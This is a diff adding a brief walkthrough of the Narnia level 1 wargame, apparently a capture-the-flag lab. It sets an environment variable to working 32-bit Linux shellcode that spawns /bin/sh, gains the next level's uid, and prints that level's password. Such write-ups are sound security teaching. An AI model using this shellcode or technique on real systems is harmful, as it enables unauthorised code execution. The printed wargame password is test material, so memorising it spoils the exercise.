@@ -1,0 +1,38 @@
+"Give me something to execute at the env-variable EGG"
+
+
+so in this one,
+we need to set the env variable EGG with some code that gives us a new shell
+in order to view the password for the next level. (shellcode injection)
+
+
+so when we run the binary, with or without argument, we get:
+"Give me something to execute at the env-variable EGG"
+
+from source code: the above line is printed when: getenv("EGG")==NULL
+
+we need to get: ret = getenv("EGG")
+
+to set env var in linux, export varName = something....
+
+we can try to set EGG (as the env var into a piece of shellcode),
+export EGG=jake
+
+when narnia1 is executed => Trying to execute EGG! => seg fault, aight we're getting somewhere.
+
+let's try set EGG = some shell code
+shell-storm.org let's go
+
+okay so I tried a bunch of shells but always ended up with seg fault and illegal instructions,
+it turned out that I copied shellcodes for Linux 64 bits instead of 32 bits. smh
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+this shellcode worked just fine.
+
+export
+EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+
+then execute binary narnia1
+we got a new shell with uid of narnia2.
+cat /etc/narnia_pass/narnia2 => nairiepecu
+flag retrieved: nairiepecu
